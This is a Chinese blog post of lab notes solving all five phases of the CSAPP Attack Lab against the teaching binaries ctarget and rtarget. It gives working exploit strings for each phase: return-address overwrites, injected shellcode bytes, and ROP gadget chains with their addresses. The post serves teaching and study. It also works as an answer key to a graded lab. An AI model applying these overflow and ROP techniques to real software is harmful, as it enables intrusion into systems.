---
title: 【深入理解计算机系统实验笔记】| Attack Lab
date: 2017-7-9 21:20:23
categories:
- 计算机科学
tags:
- 计算机科学
- 深入理解计算机系统
- 计算机系统
---

Attack Lab 的主要目的是利用程序中的缓冲区溢出漏洞来实现对系统的攻击。那么如何利用缓冲区漏洞呢？

## 第一阶段

第一个关卡不要求向程序中注入代码，而是需要输入一个「引爆字符串」来改变程序的运行轨迹，重定向运行另外一个函数。在 `ctarget` 中，`getbuf` 被函数 `test` 调用：

```c
void test() {
  int val;
  val = getbuf();
  printf("No exploit.  Getbuf returned 0x%x\n", val);
}
```

我们希望 `getbuf()` 在返回后，调用函数 `touch1` 而不是输出 val 的值。

```c
void touch1() {
  vlevel = 1;
  printf("Touch1!: You called touch1()\n");
  validate(1);
  exit(0);
}
```

我们具体要做的事情就是把 `touch1` 的开始地址放到 `getbuf` 的 `ret` 指令中，而且需要注意应该使用小端字节序。

首先，我们反汇编 `ctarget`：`objdump -d ctarget > touch1.s`
![Screen Shot 2017-05-14 at 20.32.42](/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.32.42.png)

在 touch1.s 中找到 `getbuf`：

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

我们可以看到，`getbuf` 将 `%rsp` 移动了 `0x28` 也就是 40 字节。这也就意味着，在往上 4 个字节，就是返回到 `test` 的返回地址。所以，我们就可以利用缓冲区溢出将返回地址修改掉。

现在我们看看 `touch1` 在哪里：

```
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

可以看到 `touch1` 的开始地址在 `0x004017c0`，所以我们输入的字符串可以是

```
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00
c0 17 40 00
```

然后，我们将这个字符文件转换为字节码 `./hex2raw < touch1.txt > touch1_r.txt`，然后执行 `./ctarget -q -i touch1_r.txt`:

![Screen Shot 2017-05-14 at 20.58.30](/images/2017-7-9/Screen%20Shot%202017-05-14%20at%2020.58.30.png)

通过第一关，我们就学习了通过使用缓冲区溢出来调用另外的函数。

## 第二阶段

第二阶段要求向程序中注入一小段代码，`ctarget` 中的 `touch2` 的 C 语言代码为：

```c
void touch2(unsigned val) {
  vlevel = 2;    /* Part of validation protocol */
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

我们需要把自己的 cookie 作为参数传入，因为只有一个参数，所以参数应该被放入寄存器 `%rdi`，并使用`ret` 跳转。

我们写好需要注入的汇编代码，首先将 cookie 的值保存到寄存器 `%rdi`，然后将 `touch2` 的地址压入栈中，最后返回：

```
mov $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

接下来，我们将汇编代码转换为机器码：

```
gcc -c touch2.s
objdump -d touch2.o > touch2.bytes
```

touch2.bytes 中的内容为：

```
touch2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

为了执行这段代码，我们需要使用阶段 1 中的方法，跳转到缓冲区的开始位置，去执行我们注入的代码。为了知道缓冲区的起始位置，我们使用 GDB 来调试程序，查看 `%rsp` 的值。我们在 0x4017b4 处设置断点：

![Screen Shot 2017-05-15 at 20.34.41](/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.34.41.png)

然后查看寄存器信息：

![Screen Shot 2017-05-15 at 20.35.08](/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.35.08.png)

可以看到缓冲区的起始位置为 0x5561dc78。

接下来我们就构造需要的字符串：

```
48 c7 c7 fa 
97 b9 59 68 
ec 17 40 00 
c3 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

然后，我们使用 `./hex2raw < touch2.txt > touch2_r.txt` 生成字节码，然后执行命令 `./ctarget -i touch2_r.txt -q`，就可以看到执行结果：

![Screen Shot 2017-05-15 at 20.52.44](/images/2017-7-9/Screen%20Shot%202017-05-15%20at%2020.52.44.png)

## 第三阶段

第三阶段同样要实现代码注入攻击，但是要传入一个额外的字符串。

在 `ctarget` 中 `hexmatch` 和 `touch3` 的 C 语言代码如下：

```c
/* compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
  char cbuf[110];
  /* make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
  vlevel = 3;
  if (hexmatch(cookie, sval)) {
    printf("Touch3!: You called You called touch3(\"%s\")\n", sval)
    validate(3);
  } else {
    printf("Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

我们需要在引爆字符串中包含自己 cookie 的字符串表示，这个字符串应该是 8 个 16 进制数字，并以 0 为结尾。这个字符串的地址应该被保存在 `%rdi` 中。当函数 `hexmatch` 和 `strncmp` 被调用的时候，他们会把参数保存到栈上，这会覆盖 `getbuf` 写入的部分内容。所以，我们需要小心引爆字符串的存放位置。

首先将我的 cookie 转换为 字符串形式：

```
0x59b997fa -> 35 39 62 39 39 37 66 61 00
```

为了测试 ` hexmatch` 的行为，我们对上一节的字节码稍作修改，将我的 cookie 的字符串表示存储在缓冲区内，并使程序跳转到 `touch3`，构造字节码如下：

```
48 c7 c7 b8 
dc 61 55 68 
fa 18 40 00 
c3 00 00 00 
35 39 62 39 
39 37 66 61 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
```

跳转到 `touch3` 后，我们可以找到调用 `hexmatch` 的位置，于是可以分别在前后两行设置断点，并观察缓冲区的变化：

```
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
```

在调用 `hexmatch` 之前，我们可以看到缓冲区的信息如下：

![Screen Shot 2017-05-21 at 16.02.55](/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.02.55.png)

在调用 `hexmatch` 之后，我们可以看到缓冲区信息为：
![Screen Shot 2017-05-21 at 16.03.06](/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.03.06.png)

可以看到，缓冲区前三行的内容全部为打乱了，我们保存的字符串信息也被完全破坏了。所以，我们需要为字符串寻找一个新的存放位置。

看到最后一行，`0x5561dcb8` 之后的位置没有被使用，而且刚好可以存放我们的字符串，所以，抱着试一试的态度，我将字符串目标地址设置为 `0x5561dcb8`，并将 cookie 的字符串信息保存到相应位置。

汇编代码为：
```
mov $0x5561dcb8,%rdi
pushq $0x4018fa
ret
```

构造字符串为：

```
48 c7 c7 b8 
dc 61 55 68 
fa 18 40 00 
c3 00 00 00 
35 39 62 39 
39 37 66 61 
00 00 00 00 
00 00 00 00 
00 00 00 00 
00 00 00 00 
78 dc 61 55
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
35 39 62 39
39 37 66 61
00 00 00 00
```

运行程序：

![Screen Shot 2017-05-21 at 16.19.59](/images/2017-7-9/Screen%20Shot%202017-05-21%20at%2016.19.59.png)

成功！

## 第四阶段

从第四阶段开始，我们要对 `rtarget` 进行缓冲区攻击。但是攻击 `rtarget` 要更加困难，因为它采用了两种方法来防止缓冲区攻击：

1. 栈的内容是随机的，每次运行时，栈中内容的地址都不一样。所以我们无法决定应该跳转的地址。
2. 栈中代码是不可以执行的，所以即使我们可以跳转到注入代码，程序也会遇到段错误。

幸运的是，我们可以通过执行已有的代码来达到我们的目的，而不是注入新的代码，这种方法被称为 `return-oriented-programming`（ROP）。ROP 的策略是在程序中找到指定的字节序列，这些字节序列包含某些指令并以`ret`结尾。这样的一个字节序列被称为一个 *gadget*。

![Screen Shot 2017-07-09 at 20.09.59](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.09.59.png)
由上图可以看出，栈可以用来设置跳转到 n 个 *gadget*，并执行其中的代码。使用这种方式，利用 `ret` 指令，我们可以运行一连串的 *gadget* 并执行其中的代码。

例如下面的代码：

```c
void setval_210(unsigned *p) {
    *p = 3347663060U;
}
```

它对应的汇编代码为：

```
0000000000400f15 <setval_210>:
  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
  400f1b:       c3                      retq
```

字节序列 `48 89 c7` 编码了指令 `movq %rax, %rdi`，这个字节序列后面跟着 `c3`，也就是 `ret` 指令，它可以让我们跳入下一个 *gadget*。那么我们就可以利用字节序列的开始地址 `0x400f19` 还使用指令。

指令的16进制编码可以在下表中查看：

![Screen Shot 2017-07-09 at 20.20.34](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.34.png)
![Screen Shot 2017-07-09 at 20.20.54](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.20.54.png)
![Screen Shot 2017-07-09 at 20.21.01](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.01.png)
![Screen Shot 2017-07-09 at 20.21.10](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2020.21.10.png)

另外两个指令是：

* `ret`：字节编码为 `0xc3`
* `nop`：让程序计数器加一，什么都不做，字节编码为`0x90`

在终端运行命令 `objdump -d rtarget > rtarget.txt`，以寻找目标代码。
现在我们要重复第二阶段的任务：将自己的 cookie 作为参数传入 `touch2`。我们需要做三步：

1. 将 cookie 传入`%rdi`中
2. 将 `touch2` 地址放入栈中
3. 执行 `touch2`

为了将 cookie 存入 `%rdi`，最简单的想法是先将 cookie 存入栈中，再从栈中弹出。但是找不到 `popq %rdi`，只找到了 `popq %rax`，代码地址为：

```
00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq  
```

所以我们的第一个 *gadget* 的地址为 `0x4019ab`。

后面的动作可以用下面的汇编代码完成：

```
popq %rax
movq %rax %edi
ret
```

其中 `movq %rax %edi` 的字节码为：`48 89 c7 c3`。我们可以在下面的代码中找到：

```
00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq
```

所以我们第二个 *gadget* 的地址为 `0x4019c5`。

所以我们要构造的文件应该包含三部分，首先是40字节的缓冲区，然后是 `gadget1` 的地址，cookie，`gadget2` 的地址，最后是 `touch2` 的地址。构造 rtarget4.txt 如下：

```
cc cc cc cc cc cc cc cc cc cc                                                                                           
cc cc cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc cc cc
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00  
c5 19 40 00 00 00 00 00  
ec 17 40 00 00 00 00 00 
```

我们先生成它的二进制码：`.\hex2raw < rtarget4.txt > rtarget4_r.txt`。
然后执行 `.\rtarget -i rtarget4_r.txt -q`，得到：

![Screen Shot 2017-07-09 at 17.13.01](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2017.13.01.png)

成功。

## 第五阶段

阶段五的目标和阶段三一样，首先使用 cookie 构造字符串，然后将字符串作为参数传入 `touch3`。

首先，我们把 cookie 转换成 ascii 码：

```
0x59b997fa -> 35 39 62 39 39 37 66 61 00
```

我们接下来的思路为：

1. 获得 `%rsp` 的地址
2. 将（栈的起始地址）+（cookie 的偏移量）放入某个寄存器中
3. 将寄存器的值放入 `%rdi` 中
4. 调用 `touch3`

首先，寻找 `movq %rsp, %rax`, `48 89 e0`。

我们可以找到如下代码片段：

```
0000000000401aab <setval_350>:
  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:   c3                      retq
```

所以 `gadget1` 的地址为 `0x401aad`。

接下来，我们需要递增 `%rax` 的地址，我们可以找到：

```
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq
```

得 `gadget2` 的地址为：`0x4019d8`。

接下来要将 `%rax` 的内容移动到 `%rdi` 中，找到 `mov %rax, %rdi`, `48 89 c7` 的代码片段：

```
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

得到 `gadget3` 的地址为：`0x4019a2`。

最后，攻击文件应该包括：填充区1，gadget1，gadget2，gadget3，touch3的地址，填充区2，cookie。第二个填充区的大小为55(0x37) - 3 * 8 = 31字节。`rtarget5.txt` 的内容为：

```
cc cc cc cc cc cc cc cc cc cc                                                                                           
cc cc cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc cc cc
cc cc cc cc cc cc cc cc cc cc
ad 1a 40 00 00 00 00 00
d8 19 40 00 00 00 00 00  
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
dd dd dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd dd dd
dd dd dd dd dd dd dd dd dd dd
dd
35 39 62 39 39 37 66 61 00
```

我们先生成它的二进制码：`.\hex2raw < rtarget5.txt > rtarget5_r.txt`。
然后执行 `.\rtarget -i rtarget5_r.txt -q`，得到：

![Screen Shot 2017-07-09 at 19.58.10](/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2019.58.10.png)

成功。

## 总结

这次实验真的加深了我对内存和缓冲区的理解。以前上专业课，所有的知识都停留在书本上，没有做到学以致用。而这次实验，通过汇编、反汇编的、拼凑内存内容的方式直接和操作系统底层打交道，真的很有趣，但是也很要求精确。

现在看看，我们平时用高级语言写与系统无关的代码是一件多么幸福的事情啊。

我觉得学习操作系统，阅读 CSAPP，就是让我能够站在系统工作原理的粒度上理解代码，理解 C 语言和汇编，这种思考方式和视角才是阅读 CSAPP 和完成这些实验之后，我获得的最大的收获。

